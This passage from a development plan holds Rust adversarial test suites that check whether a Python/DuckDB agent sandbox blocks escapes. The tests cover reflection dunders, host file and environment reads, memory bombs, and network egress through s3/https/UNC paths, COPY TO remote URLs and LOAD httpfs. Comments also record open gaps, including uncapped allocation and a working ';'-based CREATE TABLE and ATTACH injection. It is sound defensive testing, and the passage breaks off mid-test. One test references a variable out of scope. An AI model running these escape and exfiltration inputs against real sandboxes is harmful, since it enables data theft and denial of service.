        let mut s = Session::new("sx-globals").unwrap(); let r = s.run_code("[].__class__.__init__.__globals__");
        assert!(r.is_err(), "__globals__ on a method must raise, never yield module globals");
    }

    /// `HOLDS` — Pokes the magic __builtins__ binding directly in the global namespace — distinct from attribute-chain walks. NameLookup resumes Undefined -> NameError.
    /// seam: monty global namespace via session.rs NameLookup->Undefined arm; direct __builtins__ access
    #[test]
    fn builtins_dunder_poke_is_blocked() {
        let mut s = Session::new("sx-builtins").unwrap(); let r = s.run_code("__builtins__['eval']");
        assert!(r.is_err(), "__builtins__ must be unreachable as a name");
    }

    /// `HOLDS` — globals() is a distinct namespace-leak builtin (separate from the __builtins__ binding).
    /// seam: monty BuiltinsFunctions enum — Globals commented out in builtins/mod.rs
    #[test]
    fn globals_builtin_is_blocked() {
        let mut s = Session::new("sx-globals-fn").unwrap(); let r = s.run_code("globals()");
        assert!(r.is_err(), "globals() builtin must be absent -> NameError");
    }

    /// `HOLDS` — Local-scope dict leak — different reflection primitive than globals()/__builtins__.
    /// seam: monty BuiltinsFunctions enum — Locals commented out
    #[test]
    fn locals_builtin_is_blocked() {
        let mut s = Session::new("sx-locals").unwrap(); let r = s.run_code("locals()");
        assert!(r.is_err(), "locals() must be absent");
    }

    /// `HOLDS` — compile() forges code objects bypassing source filtering — distinct dynamic-code vector from eval/exec (already in security_tests).
    /// seam: monty BuiltinsFunctions — Compile commented out; code-object forging path
    #[test]
    fn compile_builtin_is_blocked() {
        let mut s = Session::new("sx-compile").unwrap(); let r = s.run_code("compile('1+1','<s>','eval')");
        assert!(r.is_err(), "compile() must be absent");
    }

    /// `HOLDS` — breakpoint() routes through sys.breakpointhook/pdb and can import arbitrary modules — different escape than eval/compile.
    /// seam: monty BuiltinsFunctions — Breakpoint commented out; PYTHONBREAKPOINT/pdb host pivot
    #[test]
    fn breakpoint_builtin_is_blocked() {
        let mut s = Session::new("sx-breakpoint").unwrap(); let r = s.run_code("breakpoint()");
        assert!(r.is_err(), "breakpoint() must be absent");
    }

    /// `HOLDS` — help() spawns a pager and input() reads host stdin — homogeneous I/O-builtin family, each a distinct host-channel gadget; sub-family table permitted.
    /// seam: monty BuiltinsFunctions — Help, Input commented out; pager + stdin host I/O
    #[test]
    fn help_and_input_builtins_are_blocked() {
        for (i,code) in ["help(str)","input()"].iter().enumerate() { let mut s = Session::new(&format!("sx-io-{i}")).unwrap(); assert!(s.run_code(code).is_err(), "{code} must be absent"); }
        assert!(s.run_code(code).is_err(), "interactive I/O builtins must be NameErrors");
    }

    /// `PROBE` — open() is the ONE builtin monty implements as a host OsCall; session.rs blindly resumes every OsCall with None. None-where-FileHandle-expected must surface as Err, never a host read.
    /// seam: monty builtins/open.rs CallResult::OsCall(Open); session.rs OsCall arm resumes MontyObject::None
    #[test]
    fn open_oscall_resumes_none_no_host_read() {
        let dir = std::env::temp_dir().join("droplet-sx-open"); std::fs::create_dir_all(&dir).unwrap(); let secret = dir.join("s.txt"); std::fs::write(&secret,"TOPSECRET").unwrap(); let mut s = Session::new("sx-open").unwrap(); let code = format!("open({:?}).read()", secret.to_str().unwrap()); let r = s.run_code(&code);
        assert!(r.is_err(), "open() OsCall resumed with None so .read() must raise; got {r:?}"); assert!(!format!("{r:?}").contains("TOPSECRET"), "host file content must never appear"); let _=std::fs::remove_dir_all(&dir);
    }

    /// `PROBE` — Distinct from the read angle: a filesystem-mutation invariant (no host file created), not just an Err.
    /// seam: monty open(mode='w') -> OsCall(Open) truncate effect; session.rs OsCall arm never writes
    #[test]
    fn open_write_oscall_creates_no_host_file() {
        let dir = std::env::temp_dir().join("droplet-sx-openw"); std::fs::create_dir_all(&dir).unwrap(); let victim = dir.join("created.txt"); let mut s = Session::new("sx-openw").unwrap(); let code = format!("f = open({:?}, 'w')\nf.write('x')", victim.to_str().unwrap()); let _ = s.run_code(&code);
        assert!(!victim.exists(), "open('w')/write must not create or truncate a host file via the OsCall path"); let _=std::fs::remove_dir_all(&dir);
    }

    /// `PROBE` — A second, independent host-FS channel beyond builtin open(): pathlib read_text -> OsFunctionCall::ReadText. Different code path reaching the same OsCall arm.
    /// seam: monty modules/pathlib.rs Path.read_text -> OsCall(ReadText); session.rs OsCall arm resumes None
    #[test]
    fn pathlib_read_text_returns_none_not_host_content() {
        let mut s = Session::new("sx-pathlib").unwrap(); let r = s.run_code("import pathlib\npathlib.Path('/etc/passwd').read_text()");
        match r { Ok(v) => assert_eq!(v, MontyObject::None, "read_text OsCall resumed with None must yield None, not host file content"), Err(_) => {} } assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "session survives the pathlib OsCall path");
    }

    /// `PROBE` — `import os` succeeds and os.getenv is a real OsCall — distinct from security_tests' 'read env' row (os.environ.get). Pins that the None-resume severs the single-key env-exfil channel.
    /// seam: monty modules/os.rs getenv -> OsCall(Getenv); session.rs OsCall arm resumes None
    #[test]
    fn os_getenv_oscall_does_not_leak_real_env() {
        unsafe { std::env::set_var("DROPLET_SX_SECRET","LEAKME"); } let mut s = Session::new("sx-getenv").unwrap(); let out = s.run_code("import os\nos.getenv('DROPLET_SX_SECRET')");
        match out { Ok(v) => assert!(!format!("{v:?}").contains("LEAKME"), "os.getenv must not return the real host env value"), Err(_) => {} } unsafe { std::env::remove_var("DROPLET_SX_SECRET"); }
    }

    /// `PROBE` — os.environ is a property-backed OsCall distinct from getenv (whole-environment dump vs single key). Confirms the None-resume severs the bulk channel even after dict().
    /// seam: monty os.environ property -> ZeroArgOsProperty::GetEnviron OsCall; session.rs resumes None
    #[test]
    fn os_environ_oscall_does_not_leak_full_env() {
        unsafe { std::env::set_var("DROPLET_SX_ENVIRON","LEAKALL"); } let mut s = Session::new("sx-environ").unwrap(); let out = s.run_code("import os\ndict(os.environ)"); unsafe { std::env::remove_var("DROPLET_SX_ENVIRON"); }
        match out { Ok(v)=>assert!(!format!("{v:?}").contains("LEAKALL"), "os.environ must not materialize the host environment"), Err(_)=>{} }
    }

    /// `PROBE` — Exercises the asyncio coroutine/future machinery and the ResolveFutures suspension boundary — a different arm than FunctionCall/OsCall. Contract: no-panic + REPL survival regardless of whether the coroutine body runs.
    /// seam: monty modules/asyncio.rs gather + session.rs ResolveFutures arm (resumes pending futures with Return(None))
    #[test]
    fn asyncio_gather_through_resolvefutures_is_contained() {
        let dir=std::env::temp_dir().join("droplet-sx-async"); std::fs::create_dir_all(&dir).unwrap(); let p=dir.join("sales.parquet"); { let c=duckdb::Connection::open_in_memory().unwrap(); c.execute_batch(&format!("COPY (SELECT 'EU' r, 1.0::DOUBLE a) TO '{}' (FORMAT PARQUET)", p.to_str().unwrap())).unwrap(); } let mut s=Session::new("sx-async").unwrap(); let code=format!("import asyncio\nasync def f():\n    return query({:?}, 'SELECT * FROM data')\nasyncio.gather(f())", p.to_str().unwrap()); let r = s.run_code(&code);
        assert!(r.is_ok() || r.is_err(), "must terminate without panic"); assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "session must survive the async/ResolveFutures path"); let _=std::fs::remove_dir_all(&dir);
    }

    /// `PROBE` — Materialization bomb via BigInt->decimal: str() forces the digits. Distinct from recursion and the raw string bomb. Contained by the CPython-style int-string-conversion cap, independent of NoLimitTracker.
    /// seam: monty int->str digit-limit guard (4300, sys.int_info) reached via run_code; 2**10_000_000 bomb
    #[test]
    fn huge_int_str_materialization_is_contained() {
        let mut s = Session::new("sx-bigint").unwrap(); let r = s.run_code("len(str(2 ** 10000000))");
        assert!(r.is_err(), "str() of an astronomically large int must hit the 4300-digit int-string-conversion limit (ValueError), not OOM/abort the host; got {r:?}"); assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "session survives the big-int attempt");
    }

    /// `CANARY` — Memory-amplification gadget ('a'*1000 each replaced by 'b'*1M). Distinct from big-int (digit cap) and recursion (stack cap): attacks raw heap allocation, which has NO cap in Droplet.
    /// seam: monty resource.rs check_replace_size/check_estimated_size -> NoLimitTracker::check_large_result (always Ok) via run_code
    #[test]
    fn raw_string_replace_bomb_is_currently_unbounded() {
        let mut s = Session::new("sx-bigstr").unwrap(); let r = s.run_code("len(('a' * 1000).replace('a', 'b' * 1000000))");
        assert!(matches!(r, Ok(MontyObject::Int(1_000_000_000))), "CANARY: under the wired NoLimitTracker the string-amplification guard does NOT fire — a ~1GB string is materialized and returned. Flip to is_err() once a LimitedTracker (ResourceLimits::new().max_allocations/memory) is wired; got {r:?}"); assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "session survives");
    }

    /// `CANARY` — Distinct allocation gadget from replace-amplification: a plain str*int with no replace machinery — the simplest direct heap-allocation bomb. Pins that even the most basic memory DoS is uncapped.
    /// seam: monty str __mul__ allocation through NoLimitTracker::on_allocate (always Ok) via run_code
    #[test]
    fn python_string_repeat_is_currently_unbounded() {
        let mut s = Session::new("sx-strmul").unwrap(); let r = s.run_code("len('x' * 50000000)");
        assert!(matches!(r, Ok(MontyObject::Int(50_000_000))), "CANARY: agent-level string repeat is unbounded under NoLimitTracker (50M-char string built). Flip to is_err() when a LimitedTracker is wired; got {r:?}"); assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "session survives");
    }

    /// `PROBE` — Reference-cycle / GC-root gadget: builds a->b->a across the run boundary. Distinct from UAF and allocation — targets cycle collection / root-set traversal.
    /// seam: monty heap/GC root-set + cycle collector via run_code; self-referential list cycle
    #[test]
    fn reference_cycle_does_not_leak_or_crash() {
        let mut s = Session::new("sx-cycle").unwrap(); let code = "a = []\nb = [a]\na.append(b)\nlen(a)"; let r = s.run_code(code);
        assert!(matches!(r, Ok(MontyObject::Int(1))), "a reference cycle must be built and measured without panic; got {r:?}"); assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "session survives a cyclic structure");
    }

    /// `PROBE` — Different consequence of cycles than construction: forces the formatter to traverse the cycle. repr_sequence_fmt has an incr_recursion_depth guard returning '...'.
    /// seam: monty list.rs repr_sequence_fmt incr_recursion_depth cycle guard when repr() walks a cyclic list
    #[test]
    fn repr_of_self_referential_list_is_contained() {
        let mut s = Session::new("sx-cycle-repr").unwrap(); let code = "a = []\na.append(a)\nrepr(a)"; let r = s.run_code(code);
        assert!(matches!(r, Ok(MontyObject::String(ref v)) if v.contains("...")), "repr of a self-referential list must use the cycle guard ('...'), not infinite-recurse the host; got {r:?}"); assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "session survives");
    }

    /// `HOLDS` — Type-confusion gadget: a mutating list method on an immutable bytes object probes whether per-type method tables are disjoint (bytes-as-list confusion would be memory-unsafe).
    /// seam: monty types/bytes.rs attribute_error path; calling a list method on a bytes object
    #[test]
    fn bytes_type_confusion_method_call_is_blocked() {
        let mut s = Session::new("sx-typeconf").unwrap(); let r = s.run_code("b'abc'.append(1)");
        assert!(r.is_err(), "a bytes object must reject a list method (no type confusion); AttributeError expected");
    }

    /// `HOLDS` — setattr IS available (unlike eval/exec) — probes monkey-patching a builtin type to inject a gadget. Distinct from getattr-dynamic and from read-only dunder walks.
    /// seam: monty builtins/setattr.rs against an immutable builtin type; __dict__-less mutation probe
    #[test]
    fn setattr_on_int_cannot_inject_attribute() {
        let mut s = Session::new("sx-setattr").unwrap(); let r = s.run_code("setattr((1).__class__, 'x', 5)");
        assert!(r.is_err(), "setattr on a builtin type/instance must raise (no __dict__), preventing attribute injection / type patching");
    }

    /// `HOLDS` — getattr() with a runtime-built name is the standard way to bypass static string scanners — distinct from the literal ().__class__ chain. Confirms enforcement at the attribute layer, not source filtering.
    /// seam: monty builtins/getattr.rs delegating to the same attribute resolution; runtime-built dunder name
    #[test]
    fn getattr_dynamic_dunder_bypass_is_blocked() {
        let mut s = Session::new("sx-getattr-dyn").unwrap(); let r = s.run_code("getattr((), '__cl' + 'ass__')");
        assert!(r.is_err(), "dynamic getattr must not resolve a dunder that direct attribute access also lacks");
    }

    /// `HOLDS` — Format-string attribute access reaches object internals through the formatter rather than direct attribute syntax — a separate eval path that must also enforce the missing-dunder rule.
    /// seam: monty str.format field attribute-access path; the {0.__class__} formatter leak
    #[test]
    fn format_spec_class_leak_is_blocked() {
        let mut s = Session::new("sx-format").unwrap(); let r = s.run_code("'{0.__class__}'.format(())");
        assert!(r.is_err(), "format() field attribute access to __class__ must raise, not leak the type object");
    }

    /// `PROBE` — Probes the hashing seam: a confused hash path treating a list as hashable would enable re-entrant heap access during rehash. Different seam than sort/cycle.
    /// seam: monty builtins/hash.rs + set insertion via run_code; unhashable-mutable probe
    #[test]
    fn set_add_unhashable_list_is_contained() {
        let mut s = Session::new("sx-set-hash").unwrap(); let r = s.run_code("s = set()\na = []\ntry:\n    s.add(a)\n    out='added'\nexcept Exception:\n    out='raised'\nout");
        assert!(matches!(r, Ok(MontyObject::String(ref v)) if v=="raised"), "adding an unhashable list to a set must raise TypeError, contained; got {r:?}"); assert_eq!(s.run_code("1+1").unwrap(), MontyObject::Int(2), "session survives");
    }

    /// `HOLDS` — Exception-state-corruption angle: a raised exception escaping run_code must leave the REPL+namespace clean, so an attacker can't wedge the session into a half-dead exploitable state. Distinct from tool-Err which consumes the REPL.
    /// seam: monty Exception handling + session.rs settle() REPL restoration after a raised exception
    #[test]
    fn unhandled_exception_does_not_poison_namespace() {
        let mut s = Session::new("sx-exc-resurrect").unwrap(); let _ = s.run_code("raise ValueError('x')");
        assert_eq!(s.run_code("saved = 7\nsaved").unwrap(), MontyObject::Int(7), "REPL usable after an uncaught raise"); assert_eq!(s.run_code("saved").unwrap(), MontyObject::Int(7), "namespace persists across a prior raise (settle restored the REPL)");
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::sandbox_escape`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): sandbox_escape adversarial angles (28 tests)"
```

---

## Task 4: Network egress / data-plane reachability (16 angles)

**Files:** Create `crates/droplet-core/src/security/egress.rs`. **Reference seams:** `engine_duckdb.rs::new_in_memory` httpfs/S3 disable latch; remote paths & table functions.
**Interfaces — Consumes:** the Task 1 helper kit (dispatch/catch_dispatch/tmp_dir/sales_parquet).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/egress.rs
//! Network egress / data-plane reachability — adversarial angles. seam: `engine_duckdb.rs::new_in_memory` httpfs/S3 disable latch; remote paths & table functions.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `HOLDS` — s3:// as the path argument routed into read_parquet — the direct object-store reach via the registered path; S3FileSystem.
    /// seam: tools.rs query -> engine_duckdb.rs register_parquet: s3:// as the path arg (CREATE VIEW over read_parquet)
    #[test]
    fn egress_s3_path_arg_blocked() {
        let mut s = Session::new("egress-s3-path").unwrap();
        let err = s.run_code("query('s3://nope/x.parquet', 'SELECT * FROM data')").unwrap_err();
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // Missing-Extension at register_parquet's CREATE VIEW; httpfs never auto-installs/loads -> no socket, no rows.
    }

    /// `HOLDS` — https:// scheme as path arg — distinct filesystem (HTTPFileSystem) from S3, exercises the TLS HTTP egress vector.
    /// seam: tools.rs query -> register_parquet: https:// path arg (HTTPFileSystem)
    #[test]
    fn egress_https_path_arg_blocked() {
        let mut s = Session::new("egress-https-path").unwrap();
        let err = s.run_code("query('https://example.com/x.parquet', 'SELECT * FROM data')").unwrap_err();
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // HTTPFileSystem read needs httpfs which never loads -> Missing-Extension, no TLS connect.
    }

    /// `HOLDS` — Plaintext http:// (port 80) is a separate gadget from https:// — proves cleartext HTTP is equally dead, not just TLS.
    /// seam: tools.rs query -> register_parquet: plaintext http:// path arg
    #[test]
    fn egress_http_plaintext_path_arg_blocked() {
        let mut s = Session::new("egress-http-path").unwrap();
        let err = s.run_code("query('http://example.com/x.parquet', 'SELECT * FROM data')").unwrap_err();
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // plaintext HTTP is the same HTTPFileSystem latch -> Missing-Extension, no port-80 connect.
    }

    /// `HOLDS` — GCS scheme — DuckDB routes gcs:// through httpfs. Distinct cloud vendor from s3/azure; confirms autoload latch covers GCS.
    /// seam: tools.rs query -> register_parquet: gcs:// path arg (rides httpfs)
    #[test]
    fn egress_gcs_scheme_path_arg_blocked() {
        let mut s = Session::new("egress-gcs-path").unwrap();
        let err = s.run_code("query('gcs://bucket/x.parquet', 'SELECT * FROM data')").unwrap_err();
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // gcs:// rides httpfs -> Missing-Extension, no GCS round-trip.
    }

    /// `HOLDS` — Azure Blob uses a DIFFERENT extension ('azure') — proves autoinstall/autoload=false blocks the whole extension class, not just httpfs by name.
    /// seam: tools.rs query -> register_parquet: azure:// path arg (separate 'azure' extension, not httpfs)
    #[test]
    fn egress_azure_scheme_path_arg_blocked() {
        let mut s = Session::new("egress-azure-path").unwrap();
        let err = s.run_code("query('azure://acct/x.parquet', 'SELECT * FROM data')").unwrap_err();
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // azure:// needs the 'azure' extension (NOT httpfs) which also never auto-loads -> Missing-Extension.
    }

    /// `HOLDS` — UNC \\host\share is the SMB/CIFS reach vector. Distinct from URL schemes: it is an IO 'no files' error (local glob), NOT a Missing-Extension error, proving DuckDB does not resolve it over the network.
    /// seam: tools.rs query -> register_parquet: Windows UNC \\host\share path arg must reach DuckDB intact via raw Python literal
    #[test]
    fn egress_unc_path_arg_no_smb_reach() {
        let mut s = Session::new("egress-unc-path").unwrap();
        // raw Python string r'...' so backslashes survive Monty's parser and reach DuckDB as a UNC path
        let err = s.run_code(r#"query(r'\\evil-host\share\x.parquet', 'SELECT * FROM data')"#).unwrap_err();
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // DuckDB treats the UNC string as a LOCAL path glob ('No files found that match the pattern'), never an SMB/CIFS mount -> no egress.
    }

    /// `HOLDS` — file:// URI — a scheme that LOOKS remote but resolves locally. Distinct: confirms it never escalates to a network handler and the scheme prefix is not silently stripped into a host-file read.
    /// seam: tools.rs query -> register_parquet: file:// URI path arg resolves locally, not as a remote handler
    #[test]
    fn egress_file_uri_scheme_treated_local() {
        let mut s = Session::new("egress-file-uri").unwrap();
        let err = s.run_code("query('file:///etc/hostname', 'SELECT * FROM data')").unwrap_err();
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // file:// is not a remote FS; DuckDB's local handler returns IO Error 'No files found' for the literal 'file://...' -> no egress, no parquet decoded.
    }

    /// `HOLDS` — Remote table fn embedded in the SQL BODY (not the path arg) over an otherwise-valid local dataset — the in-SQL egress vector, distinct from the path-arg family.
    /// seam: engine_duckdb.rs local_sql (WITH data AS ...): remote read_csv() inside agent SQL over a valid local handle
    #[test]
    fn egress_read_csv_https_in_sql_blocked() {
        let dir = tmp_dir("egress-readcsv");
        let p = sales_parquet(&dir);
        let mut s = Session::new("egress-readcsv").unwrap();
        let err = s.run_code(&format!("query({p:?}, \"SELECT * FROM read_csv('https://example.com/a.csv')\")")).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // path arg is a LEGITIMATE local parquet, but the SQL body reaches out via read_csv over https -> Missing-Extension at exec, no fetch.
    }

    /// `HOLDS` — read_json is a distinct table function (different reader/format) than read_csv/read_parquet; some egress filters key on function name — proves the block is filesystem-level, covering JSON too.
    /// seam: engine_duckdb.rs local_sql: remote read_json() in agent SQL
    #[test]
    fn egress_read_json_https_in_sql_blocked() {
        let dir = tmp_dir("egress-readjson");
        let p = sales_parquet(&dir);
        let mut s = Session::new("egress-readjson").unwrap();
        let err = s.run_code(&format!("query({p:?}, \"SELECT * FROM read_json('https://example.com/a.json')\")")).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // read_json over https is the same httpfs latch -> Missing-Extension, no egress.
    }

    /// `HOLDS` — read_blob reads raw bytes — the strongest generic remote-fetch primitive (not format-bound). Distinct gadget: if any reader could pull bytes off the network it would be this one.
    /// seam: engine_duckdb.rs local_sql: remote read_blob() in agent SQL (raw-bytes remote-fetch primitive)
    #[test]
    fn egress_read_blob_https_in_sql_blocked() {
        let dir = tmp_dir("egress-readblob");
        let p = sales_parquet(&dir);
        let mut s = Session::new("egress-readblob").unwrap();
        let err = s.run_code(&format!("query({p:?}, \"SELECT * FROM read_blob('https://example.com/a.bin')\")")).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // read_blob (arbitrary remote bytes) over https -> Missing-Extension, no fetch.
    }

    /// `HOLDS` — glob() is metadata/listing reconnaissance (enumerate a bucket) rather than a full read — a distinct egress capability (discovery) the filesystem latch must also kill.
    /// seam: engine_duckdb.rs local_sql: glob() over s3:// in agent SQL (remote directory listing / recon)
    #[test]
    fn egress_glob_s3_in_sql_blocked() {
        let dir = tmp_dir("egress-glob");
        let p = sales_parquet(&dir);
        let mut s = Session::new("egress-glob").unwrap();
        let err = s.run_code(&format!("query({p:?}, \"SELECT * FROM glob('s3://nope/*.parquet')\")")).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // remote glob (bucket listing) needs httpfs -> Missing-Extension, no LIST round-trip.
    }

    /// `HOLDS` — Targets the scalar_i64 seam specifically: it bypasses the CREATE VIEW wrapping (uses conn.query_row directly). Proves the egress latch is enforced by the engine CONFIG, not a side effect of the view-create wrapper that protects query()/local_sql(). The most important 'different seam' angle.
    /// seam: engine_duckdb.rs scalar_i64: SELECT CAST(<expr>) ... via query_row, NO CREATE-VIEW wrap — remote read in the scalar expr
    #[test]
    fn egress_remote_subquery_in_scalar_expr_blocked() {
        let dir = tmp_dir("egress-scalar");
        let p = sales_parquet(&dir);
        let mut s = Session::new("egress-scalar").unwrap();
        let code = format!("ds = register({p:?})\nscalar(ds, \"(SELECT COUNT(*) FROM read_csv('https://example.com/a.csv'))\")");
        let err = s.run_code(&code).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // scalar() runs via query_row WITHOUT the CREATE-VIEW wrap, yet the remote read still Missing-Extensions at exec -> egress blocked on the non-view code path too.
    }

    /// `HOLDS` — Attacks the V1b handle surface (filter_rows where_sql) not query()/local_sql. The predicate slot is a different injection point; the view is lazy so egress is only attempted at to_rows — confirms deferred materialization still blocks.
    /// seam: engine_duckdb.rs filter_rows -> lazy view; remote read in a WHERE IN subquery, materialized at to_rows
    #[test]
    fn egress_remote_subquery_in_filter_where_blocked() {
        let dir = tmp_dir("egress-filter");
        let p = sales_parquet(&dir);
        let mut s = Session::new("egress-filter").unwrap();
        let code = format!("ds = register({p:?})\nf = filter_rows(ds, \"amt IN (SELECT * FROM read_parquet('s3://nope/y.parquet'))\")\nto_rows(f)");
        let err = s.run_code(&code).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // a remote read smuggled into the WHERE predicate of the handle surface is still Missing-Extension at materialization (to_rows) -> no egress.
    }

    /// `HOLDS` — The prerequisite SETUP step of an egress chain (load/install the network extension), blocked structurally by the CREATE-VIEW wrap turning LOAD/INSTALL into parser errors. Distinct from the read-attempt angles — kills the setup, not the read.
    /// seam: engine_duckdb.rs local_sql/new_view: CREATE VIEW dsN AS LOAD/INSTALL — non-SELECT prerequisite of an egress chain
    #[test]
    fn egress_load_httpfs_via_local_sql_is_parser_blocked() {
        // CORRECTED: a hard SQL/parser error inside local_sql CONSUMES the session REPL, so LOAD and
        // INSTALL must run on SEPARATE sessions — reusing one session makes the 2nd call return
        // DropletError::NotFound('session REPL consumed...'), NOT Duckdb, and the test would mis-fail.
        let mut s1 = Session::new("egress-load").unwrap();
        let err_load = s1.run_code("local_sql('LOAD httpfs', [])").unwrap_err();
        let mut s2 = Session::new("egress-install").unwrap();
        let err_install = s2.run_code("local_sql('INSTALL httpfs', [])").unwrap_err();
        assert!(matches!(err_load, DropletError::Duckdb(_)), "LOAD got {err_load:?}");
        assert!(matches!(err_install, DropletError::Duckdb(_)), "INSTALL got {err_install:?}"); // CREATE VIEW dsN AS LOAD/INSTALL is a Parser Error -> the agent cannot arm httpfs to begin an egress chain.
    }

    /// `HOLDS` — The deepest angle: even if an attacker somehow LOADs httpfs (which the agent surface cannot, but a future parser-wrap regression might allow), the disabled_filesystems Permission latch still blocks the read, and it is provably one-way. The second, independent defense layer.
    /// seam: engine_duckdb.rs new_in_memory disabled_filesystems latch — white-box raw Connection mirroring the engine config
    #[test]
    fn egress_one_way_latch_blocks_s3_even_after_httpfs_loaded() {
        // White-box: reproduce the engine's exact hardening on a raw conn, FORCE-load httpfs
        // (the one thing the agent surface cannot do), then prove the disabled_filesystems latch
        // still blocks the read AND cannot be cleared.
        let conn = duckdb::Connection::open_in_memory().unwrap();
        conn.execute_batch(
            "SET autoinstall_known_extensions=false; \
             SET autoload_known_extensions=false; \
             SET disabled_filesystems='HTTPFileSystem,S3FileSystem';",
        ).unwrap();
        let _ = conn.execute_batch("INSTALL httpfs; LOAD httpfs;"); // succeeds: httpfs IS loadable
        let read = conn.execute_batch("CREATE VIEW v AS SELECT * FROM read_parquet('s3://nope/x.parquet')");
        let clear = conn.execute_batch("SET disabled_filesystems=''");
        let reset = conn.execute_batch("RESET disabled_filesystems");
        assert!(read.is_err(), "s3 read must be blocked even with httpfs loaded (Permission Error: File system S3FileSystem has been disabled by configuration)");
        assert!(clear.is_err(), "disabled_filesystems must not be clearable on a running db (one-way latch)");
        assert!(reset.is_err(), "disabled_filesystems must not be RESET-able on a running db (one-way latch)");
    }

    /// `HOLDS` — OUTBOUND (push) egress rather than inbound (pull) — COPY TO a remote URL is exfiltration via write. Distinct direction from every read-based angle; blocked at the parser by the view wrap before the httpfs latch even matters.
    /// seam: engine_duckdb.rs local_sql/new_view: CREATE VIEW wrap turns COPY ... TO into a parser error (outbound PUSH egress)
    #[test]
    fn egress_copy_to_https_write_is_blocked() {
        let dir = tmp_dir("egress-copyout");
        let p = sales_parquet(&dir);
        let mut s = Session::new("egress-copyout").unwrap();
        let err = s.run_code(&format!("query({p:?}, \"COPY data TO 'https://example.com/out.parquet'\")")).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // COPY ... TO is a write/PUSH egress; CREATE VIEW dsN AS WITH data AS (...) COPY ... is a Parser Error -> the agent cannot PUSH data out over the network either.
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::egress`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): egress adversarial angles (16 tests)"
```

---

## Task 5: Writes / DDL / statement-shape escapes (15 angles)

**Files:** Create `crates/droplet-core/src/security/writes_ddl.rs`. **Reference seams:** the `CREATE VIEW … AS (<sql>)` wrapper in `query`; COPY/INSTALL/ATTACH/PRAGMA/SET/multi-statement.
**Interfaces — Consumes:** the Task 1 helper kit (dispatch/catch_dispatch/tmp_dir/sales_parquet).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/writes_ddl.rs
//! Writes / DDL / statement-shape escapes — adversarial angles. seam: the `CREATE VIEW … AS (<sql>)` wrapper in `query`; COPY/INSTALL/ATTACH/PRAGMA/SET/multi-statement.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `PROBE` — Same ';' seam, different gadget: persistent DDL (CREATE TABLE = engine-state/namespace mutation) reached through the handle-surface local_sql tool with empty datasets (no WITH prefix), not query().
    /// seam: tools.rs local_sql tool -> engine_duckdb.rs local_sql -> new_view execute_batch; the 2nd statement CREATE TABLE persists in the session engine. local_sql with empty datasets splices sql verbatim into CREATE VIEW ds_n AS <sql>.
    #[test]
    fn multistatement_create_table_executes_write() {
        let mut s = Session::new("wddl-ctas").unwrap(); let r = s.run_code("local_sql('SELECT 1 AS x; CREATE TABLE evil AS SELECT 1', [])"); let evil_exists = s.run_code("local_sql('SELECT * FROM evil', [])").is_ok();
        assert!(r.is_err(), "BREAKOUT: smuggled CREATE TABLE via ';' must be rejected, not silently executed"); assert!(!evil_exists, "the smuggled CREATE TABLE must not have created a real table in the session engine"); // CURRENTLY FAILS: empirically r.is_ok() (returns Int handle) and a follow-up SELECT * FROM evil succeeds (evil persists).
    }

    /// `PROBE` — ATTACH is a distinct DDL gadget: it widens the connection's reachable catalog (other DB files) — a different escalation than COPY (filesystem write) or CREATE TABLE (in-engine namespace).
    /// seam: engine_duckdb.rs new_view execute_batch; 2nd statement ATTACH adds a database to the connection catalog.
    #[test]
    fn multistatement_attach_database_succeeds() {
